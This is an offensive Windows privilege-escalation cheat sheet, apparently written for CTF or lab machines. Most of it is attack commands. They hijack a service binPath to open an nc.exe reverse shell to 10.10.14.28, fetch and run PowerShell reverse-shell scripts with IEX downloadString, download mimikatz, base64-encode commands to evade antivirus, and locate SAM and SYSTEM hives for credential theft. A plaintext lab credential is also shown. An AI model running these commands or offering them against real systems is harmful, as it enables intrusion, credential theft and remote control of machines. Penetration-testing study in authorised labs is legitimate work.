Made By J3wker

██╗ ██╗██████╗ ██╗ ██╗██╗ ██╗███████╗██████╗ ██╗ ██╔╝ ██║╚════██╗██║ ██║██║ ██╔╝██╔════╝██╔══██╗ ╚██╗ ██╔╝█████╗ ██║ █████╔╝██║ █╗ ██║█████╔╝ █████╗ ██████╔╝█████╗╚██╗ ╚██╗╚════╝██ ██║ ╚═══██╗██║███╗██║██╔═██╗ ██╔══╝ ██╔══██╗╚════╝██╔╝ ╚██╗ ╚█████╔╝██████╔╝╚███╔███╔╝██║ ██╗███████╗██║ ██║ ██╔╝ ╚═╝ ╚════╝ ╚═════╝ ╚══╝╚══╝ ╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╚═╝

BEFORE STARTING !! if system before 2012 - try juciypotato use systeminfo | google the system and update version - look for CVE's and kernel Exploits. If nothing found start the check list.

Check List:

use windows-exploit-suggester.py
systeminfo > sys.txt

Transfer sys.txt to kali and use this with the python script.

Example:

python windows-exploit-suggester.py --database 2019-10-11-mssb.xls --systeminfo sys.txt

In order to get the database file do python windows-exploit-suggester.py --update

NOTE: List files you saw when you enumerated the web and looked intersering. Example:

secret.php db.php auth.php

Read them after getting a basic shell - might have creds in them if so net user try the creds against users - maybe it matches.

Example: runas /user:Administrator cmd.exe Check running process

ps
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
remmber PID of weird process Write it down and use 2. netstat -ano Check for open ports - google that port - what is it ?

see Users 3. net user

see specific username information / groups 4. net user username - which group is he in ? Logs reader ? read logs - maybe passwords hidden, maybe automatic script the read logs inject command!, part of "Remote Management Group" ? maybe use WinRM

check Credentials mananger:
dir C:\Users\username\AppData\Local\Microsoft\Credentials\ dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\ cmdkey /list if is has keys try:

Domain could be also Hostname or just use username alone runas /user:DOMAIN\Username /savecred command

if that doesnt work - try Meterpreter load incognito- maybe impersonate to a certain user

check Documents folder
check Downloads folder
check Program Files (x86) folder
check Program Files folder
check AppData folder and etc Local - LocalLow - Roaming
Look for werid files and installed programs - look for exploits in them.

check services with write access - to change binpath
accesschk.exe -accepteula -uvwc *

Example:

sc config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.14.28 9001 -e cmd.exe" $ Start a listener on port 9001
sc stop usosvc
sc start usosvc
get a shell.
Check for files like .txt / .php - read them. check for automated scripts that are waiting for scertain files for example:
"Admin is waiting for PDF drop it in C:\Docs" - create a Malicious PDF - drop it

Look for backups files SAM.bak - SYSTEM.bak/ windows image backup.
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
What Groups are on the system? net localgroup

Unquoated services ? if so hijack it!

wmic service get name,displayname,pathname,startmode 2>nul |findstr /i "Auto" 2>nul |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """
What scheduled tasks are there? Anything custom implemented?
schtasks /query /fo LIST 2>nul | findstr TaskName

or in powershell:

Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

what is running on startup ?
wmic startup get caption,command

Permissions on specific folders ?
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
NOTE: Change the value of "Everyone" to your desire. example:

icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
If you have user Creds and WinRM is open try:
NOTE: Change Values $user and $pw to match your case.

$user = 'SNIPER\Chris'
$pw = '36mEAhz/B8xQ~2VM'
$secpw = ConvertTo-SecureString $pw -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $user,$secpw
Possible to convert into one-liner:

$user = 'SNIPER\Chris';$pw = '36mEAhz/B8xQ~2VM';$secpw = ConvertTo-SecureString $pw -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential $user,$secpw
and then:

Invoke-Command -Computer localhost -Credential $cred -ScriptBlock {command}
Get command at the user you prompted

If WinRM isn't available do the same to store creds but use
Start-Process -FilePath "powershell.exe" -Argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8/Invoke-PowerShellTcp.ps1')" -Credential $cred
Wanna Download something?
IEX(New-Object Net.WebClient).downloadString('URL')
(New-Object Net.WebClient).DownloadFile('http://10.10.14.28/mimikatz.exe', 'mimikatz.exe')
AV on ? Command Filtering ?
cat Invoke-PowerShellTcp.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard
or with a command in plain-text:

echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.28/Invoke-PowerShellAdmin.ps1')" | iconv -t UTF-16LE | base64 -w 0 | xclip -selection clipboard
to execute the output use

powershell -enc

exmaple : Note - not real output of base64 made it shorter for example.

powershell -enc AMAAuADEANAAuADIAOAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABBAGQAbQB
